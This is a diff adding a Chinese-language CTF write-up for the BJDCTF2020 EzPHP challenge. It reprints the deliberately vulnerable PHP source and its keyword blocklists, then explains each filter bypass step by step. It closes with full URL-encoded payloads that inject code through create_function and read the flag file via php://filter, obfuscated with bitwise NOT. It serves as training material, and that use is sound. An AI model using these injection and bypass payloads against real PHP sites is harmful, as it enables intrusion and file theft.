@@ -6718,7 +6718,172 @@ payload：
 
 ![image-20240222181001970](CTF.assets/image-20240222181001970.png)
 
+## BUUOJ [BJDCTF2020]EzPHP
 
+直接上源码
+
+```php
+<?php
+highlight_file(__FILE__);
+error_reporting(0); 
+
+$file = "1nD3x.php";
+$shana = $_GET['shana'];
+$passwd = $_GET['passwd'];
+$arg = '';
+$code = '';
+
+echo "<br /><font color=red><B>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!</B><br></font>";
+
+if($_SERVER) { 
+    if (
+        preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i', $_SERVER['QUERY_STRING'])
+        )  
+        die('You seem to want to do something bad?'); 
+}
+
+if (!preg_match('/http|https/i', $_GET['file'])) {
+    if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { 
+        $file = $_GET["file"]; 
+        echo "Neeeeee! Good Job!<br>";
+    } 
+} else die('fxck you! What do you want to do ?!');
+
+if($_REQUEST) { 
+    foreach($_REQUEST as $value) { 
+        if(preg_match('/[a-zA-Z]/i', $value))  
+            die('fxck you! I hate English!'); 
+    } 
+} 
+
+if (file_get_contents($file) !== 'debu_debu_aqua')
+    die("Aqua is the cutest five-year-old child in the world! Isn't it ?<br>");
+
+
+if ( sha1($shana) === sha1($passwd) && $shana != $passwd ){
+    extract($_GET["flag"]);
+    echo "Very good! you know my password. But what is flag?<br>";
+} else{
+    die("fxck you! you don't know my password! And you don't know sha1! why you come here!");
+}
+
+if(preg_match('/^[a-z0-9]*$/isD', $code) || 
+preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&|\$|\*|\||\<|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i', $arg) ) { 
+    die("<br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="); 
+} else { 
+    include "flag.php";
+    $code('', $arg); 
+} ?>
+```
+
+### 第一关
+
+```php
+if($_SERVER) { 
+    if (preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i', $_SERVER['QUERY_STRING']))  
+        die('You seem to want to do something bad?'); 
+}
+```
+
+`$_SERVER['QUERY_STRING']`的内容不做URL解码，如下：
+
+![image-20240226164305688](CTF.assets/image-20240226164305688.png)
+
+以此就能绕过这里的正则匹配
+
+### 第二关
+
+`$`元字符匹配结尾默认允许一个换行符，所以这里直接使用`%0a`绕过
+
+```php
+if (!preg_match('/http|https/i', $_GET['file'])) {
+    if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { 
+        $file = $_GET["file"]; 
+        echo "Neeeeee! Good Job!<br>";
+    } 
+} else die('fxck you! What do you want to do ?!');
+```
+
+### 第三关
+
+```php
+if($_REQUEST) { 
+    foreach($_REQUEST as $value) { 
+        if(preg_match('/[a-zA-Z]/i', $value))  
+            die('fxck you! I hate English!'); 
+    } 
+} 
+```
+
+`$_REQUEST`匹配`$_GET`和`$_POST`的内容，但如果有重名，则优先匹配`$_POST`，以此直接使用`$_POST`覆盖就能绕过正则
+
+![image-20240226164742342](CTF.assets/image-20240226164742342.png)
+
+### 第四关
+
+PHP 对于哈希算法的绕过基本就那几个方法了，`md5`会多一点手法，但是`sha1`就只有数组绕过了
+
+```php
+if ( sha1($shana) === sha1($passwd) && $shana != $passwd ){
+    extract($_GET["flag"]);
+    echo "Very good! you know my password. But what is flag?<br>";
+} else{
+    die("fxck you! you don't know my password! And you don't know sha1! why you come here!");
+}
+```
+
+### 第五关
+
+首先，`$code`喝`$arg`是可控的，完全可以使用`extract($_GET["flag"])`做变量覆盖！
+
+再者，由于使用的是`or`判断，所以两个正则匹配只要保证一个为True就行，这里的`$code=create_function`
+
+```php
+if(preg_match('/^[a-z0-9]*$/isD', $code) || 
+preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&|\$|\*|\||\<|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i', $arg) ) { 
+    die("<br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="); 
+} else { 
+    include "flag.php";
+    $code('', $arg); 
+}
+```
+
+后续就可以利用`create_funcion`做一个代码注入，大概原理如下：
+
+![image-20240226165504953](CTF.assets/image-20240226165504953.png)
+
+使用`}`闭合函数，再使用`//`注释后面的内容，中间就是可控的可执行代码！使用`get_defined_vars()`函数获取所有的常量
+
+```
+payload：
+POST /1nD3x.php?%64%65%62%75=%61%71%75%61_%69%73_%63%75%74%65%0a&%66%69%6C%65=%64%61%74%61%3A%2F%2F%74%65%78%74%2F%70%6C%61%69%6E%2C%64%65%62%75_%64%65%62%75_%61%71%75%61&%73%68%61%6E%61%5B%5D=1&%70%61%73%73%77%64%5B%5D=2&%66%6C%61%67%5B%63%6F%64%65%5D=%63%72%65%61%74%65_%66%75%6E%63%74%69%6F%6E&%66%6C%61%67%5B%61%72%67%5D=%7D%76%61%72_%64%75%6D%70%28%67%65%74_%64%65%66%69%6E%65%64_%76%61%72%73%28%29%29%3B%2F%2F%7D HTTP/1.1
+
+...
+
+debu=1&file=1&shana=1&passwd=1
+```
+
+![image-20240226165840349](CTF.assets/image-20240226165840349.png)
+
+最后使用`require`配合伪协议读取flag文件，由于正则过滤了单双引号，所以这里使用`~`做异或运算以获得最后payload
+
+![image-20240226165953346](CTF.assets/image-20240226165953346.png)
+
+```php
+var_dump(urldecode("require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f))
+"));
+var_dump(~(urldecode('%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f')));
+var_dump(urlencode(~('php://filter/read=convert.base64-encode/resource=rea1fl4g.php')));
+```
+
+```
+payload：
+POST /1nD3x.php?%64%65%62%75=%61%71%75%61_%69%73_%63%75%74%65%0a&%66%69%6C%65=%64%61%74%61%3A%2F%2F%74%65%78%74%2F%70%6C%61%69%6E%2C%64%65%62%75_%64%65%62%75_%61%71%75%61&%73%68%61%6E%61%5B%5D=1&%70%61%73%73%77%64%5B%5D=2&%66%6C%61%67%5B%63%6F%64%65%5D=%63%72%65%61%74%65_%66%75%6E%63%74%69%6F%6E&%66%6C%61%67%5B%61%72%67%5D=}require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));// HTTP/1.1
+
+...
+
+debu=1&file=1&shana=1&passwd=1
+```
 
 # Misc
 
